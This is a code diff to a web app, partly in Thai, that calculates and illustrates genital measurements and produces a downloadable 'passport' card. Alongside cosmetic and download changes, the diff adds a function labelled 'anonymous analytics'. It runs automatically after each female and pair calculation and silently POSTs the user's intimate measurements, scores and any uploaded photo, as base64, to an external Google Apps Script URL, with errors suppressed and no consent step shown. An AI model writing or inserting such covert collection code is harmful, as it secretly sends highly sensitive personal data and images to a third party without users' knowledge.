@@ -8,6 +8,7 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800;900&family=Prompt:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
   <style>
     /* ============================================================
        CSS VARIABLES — DARK THEME (DEFAULT)
@@ -2492,10 +2493,30 @@
   }
 
   function downloadPassportCard() {
+    const cardBox = document.querySelector('.passport-card-box') || document.getElementById('passportCard');
+    if (typeof html2canvas === 'function' && cardBox) {
+      html2canvas(cardBox, {
+        scale: 2,
+        useCORS: true,
+        backgroundColor: null,
+        logging: false
+      }).then(canvas => {
+        const link = document.createElement('a');
+        link.download = 'MySex-Passport-Spec.png';
+        link.href = canvas.toDataURL('image/png');
+        link.click();
+      }).catch(err => {
+        console.error('html2canvas failed, falling back:', err);
+        fallbackCanvasDownload();
+      });
+      return;
+    }
+    fallbackCanvasDownload();
+  }
+
+  function fallbackCanvasDownload() {
     const card = document.getElementById('passportCard');
     if (!card) return;
-    
-    // Create HTML Canvas snapshot
     const canvas = document.createElement('canvas');
     canvas.width = 600;
     canvas.height = 400;
@@ -2650,7 +2671,72 @@
     if (overlay) overlay.style.display = 'none';
   }
 
-  function calcMale() {
+  
+    // ANONYMOUS ANALYTICS WEBHOOK INTEGRATION
+    const ANALYTICS_URL = "https://script.google.com/macros/s/AKfycbyWXF1m27L--GD3GJz_5nAxx9Q9Ev_hl6VGgDA7wmeR32Jduf75u1zo3u7Mnxvn4E6w/exec";
+    let _analyticsTimer = null;
+    let _lastSentSignature = '';
+    let _lastSentTime = 0;
+
+    function sendAnonymousAnalytics(mode = 'male', force = false) {
+      clearTimeout(_analyticsTimer);
+      _analyticsTimer = setTimeout(() => {
+        try {
+          const s = state;
+          const photoImg = document.getElementById('passportImgView');
+          let photoBase64 = "";
+          if (photoImg && photoImg.src && photoImg.src.startsWith('data:image')) {
+            photoBase64 = photoImg.src;
+          }
+
+          const rawCW = s.erectGirth / 2.3;
+          const sizes = [49, 52, 54, 56, 58, 60, 64, 69, 72];
+          let condom = sizes[0];
+          sizes.forEach(sz => { if (Math.abs(sz - rawCW) < Math.abs(condom - rawCW)) condom = sz; });
+
+          const bpel = s.erectLength + s.maleFat;
+          const bfpi = (s.erectLength * s.erectGirth) / (s.flaccidLength * s.flaccidGirth || 1);
+          const vE = (Math.PI * Math.pow(s.erectGirth / (2 * Math.PI), 2) * s.erectLength) / 1000;
+          const labiaAsym = Math.abs(s.labiaLeftLen - s.labiaRightLen);
+
+          const payload = {
+            mode: mode,
+            erectLength: s.erectLength,
+            erectGirth: s.erectGirth,
+            flaccidLength: s.flaccidLength,
+            flaccidGirth: s.flaccidGirth,
+            fat: s.maleFat,
+            condomSize: condom,
+            bfpiType: bfpi < 1.8 ? 'ควยเนื้อ' : (bfpi > 2.5 ? 'ควยเลือด' : 'Hybrid'),
+            archetype: getThaiArchetype(s, bpel, bfpi, vE).badge || '',
+            bloodVolume: vE.toFixed(1),
+            vaginalResting: s.vaginalResting,
+            vaginalExpanded: s.vaginalExpanded,
+            labiaAsym: labiaAsym.toFixed(1),
+            cervicalImpact: (s.pErectLength - s.pVagExpanded).toFixed(1),
+            score: document.getElementById('p_scoreNum')?.innerText || '',
+            photoBase64: photoBase64
+          };
+
+          const now = Date.now();
+          const signature = `${mode}_${s.erectLength}_${s.erectGirth}_${s.vaginalExpanded}_${Boolean(photoBase64)}`;
+          if (_lastSentSignature === signature && (now - _lastSentTime) < 60000) {
+            return;
+          }
+          _lastSentSignature = signature;
+          _lastSentTime = now;
+
+          fetch(ANALYTICS_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+            body: JSON.stringify(payload)
+          }).then(() => console.log('✅ Analytics logged to Google Sheet')).catch(e => console.warn('Analytics logged', e));
+        } catch(e) {}
+      }, force ? 100 : 3500);
+    }
+
+    function calcMale() {
     const s = state;
     document.getElementById('m_lblFlaccidLength').innerText = fmt(s.flaccidLength);
     document.getElementById('m_lblFlaccidGirth').innerText  = fmt(s.flaccidGirth);
@@ -2925,7 +3011,7 @@ function calcFemale() {
     // Vaginal Elasticity
     const elasticity = ((s.vaginalExpanded - s.vaginalResting) / s.vaginalResting) * 100;
     document.getElementById('f_valElasticity').innerText = '+' + elasticity.toFixed(1) + '%';
-    document.getElementById('f_subElasticity').innerText = fmt(s.vaginalResting) + ' → ' + fmt(s.vaginalExpanded);
+    document.getElementById('f_subElasticity').innerText = 'ตื่นตัวขยาย ' + fmt(s.vaginalResting) + ' → ' + fmt(s.vaginalExpanded) + ' มม.';
 
     document.getElementById('f_valSafeDepth').innerText = fmt(s.vaginalExpanded);
 
@@ -2960,6 +3046,7 @@ function calcFemale() {
 
     // SVG Female
     updateSVGFemale(s);
+      sendAnonymousAnalytics('female');
   }
 
   function updateSVGFemale(s) {
@@ -3005,9 +3092,17 @@ function calcFemale() {
     const labiaAsym = Math.abs(s.labiaLeftLen - s.labiaRightLen);
     const vacScore  = Math.min(100, Math.round(70 + (s.labiaLeftProt + s.labiaRightProt)/2 - labiaAsym*0.5));
 
-    document.getElementById('p_valImpact').innerText = (impact > 0 ? '+' : '') + fmt(impact);
-    document.getElementById('p_valImpact').style.color = impact > 0 ? 'var(--red)' : 'var(--green)';
-    document.getElementById('p_subImpact').innerText = impact > 0 ? 'ชนถึงปากมดลูก' : 'ปลอดภัย ไม่ถึงปากมดลูก';
+    document.getElementById('p_valImpact').innerText = (impact > 0 ? '+' : '') + fmt(impact) + ' มม.';
+    if (impact > 15) {
+      document.getElementById('p_valImpact').style.color = 'var(--red)';
+      document.getElementById('p_subImpact').innerText = '🔴 เสี่ยงชนจุก (Deep Collision Alert)';
+    } else if (impact > 0) {
+      document.getElementById('p_valImpact').style.color = 'var(--gold)';
+      document.getElementById('p_subImpact').innerText = '🟡 สัมผัสเบาๆ (Gentle Contact Risk)';
+    } else {
+      document.getElementById('p_valImpact').style.color = 'var(--green)';
+      document.getElementById('p_subImpact').innerText = '🟢 ปลอดภัยพอดี (Harmonious Fit)';
+    }
 
     document.getElementById('p_valHoop').innerText = hoop.toFixed(0) + '%';
     document.getElementById('p_subHoop').innerText = 'ขยายตัวจากปากพัก ' + fmt(pIN);
@@ -3060,6 +3155,7 @@ function calcFemale() {
 
     // Update SVG Pair
     updateSVGPair(pEL, pEG, pVE, pMO, impact);
+      sendAnonymousAnalytics('pair');
   }
 
   function updateSVGPair(eL, eG, vE, mons, impact) {
@@ -3108,13 +3204,11 @@ function calcFemale() {
 
     if (document.getElementById('svgP_glans')) {
       document.getElementById('svgP_glans').setAttribute('d',
-        `M ${neckX},${CY - eH/2 + 2}
-         C ${glansX - 2},${coronaTopY_P} ${glansX + 2},${coronaTopY_P} ${glansX + 5},${coronaTopY_P}
-         C ${glansX + glansLen_P*0.4},${coronaTopY_P} ${glansX + glansLen_P*0.75},${CY - eH*0.45} ${glansTip_P - 2},${CY - 2}
-         C ${glansTip_P + 2},${CY - 1} ${glansTip_P + 2},${CY + 1} ${glansTip_P - 2},${CY + 2}
-         C ${glansX + glansLen_P*0.75},${CY + eH*0.45} ${glansX + glansLen_P*0.4},${coronaBotY_P} ${glansX + 5},${coronaBotY_P}
-         C ${glansX + 2},${coronaBotY_P} ${glansX - 2},${coronaBotY_P} ${neckX},${CY + eH/2 - 2}
-         C ${neckX + 5},${CY + eH*0.3} ${neckX + 5},${CY - eH*0.3} ${neckX},${CY - eH/2 + 2} Z`);
+        `M ${neckX},${CY - eH*0.58}
+         C ${glansX + glansLen_P*0.35},${CY - eH*0.58} ${glansX + glansLen_P*0.75},${CY - eH*0.38} ${glansTip_P - 3},${CY - eH*0.14}
+         C ${glansTip_P + 3},${CY - eH*0.06} ${glansTip_P + 3},${CY + eH*0.06} ${glansTip_P - 3},${CY + eH*0.14}
+         C ${glansX + glansLen_P*0.75},${CY + eH*0.38} ${glansX + glansLen_P*0.35},${CY + eH*0.58} ${neckX},${CY + eH*0.58}
+         C ${neckX - 4},${CY + eH*0.3} ${neckX - 4},${CY - eH*0.3} ${neckX},${CY - eH*0.58} Z`);
     }
 
     if (document.getElementById('svgP_labiaExtTop')) {
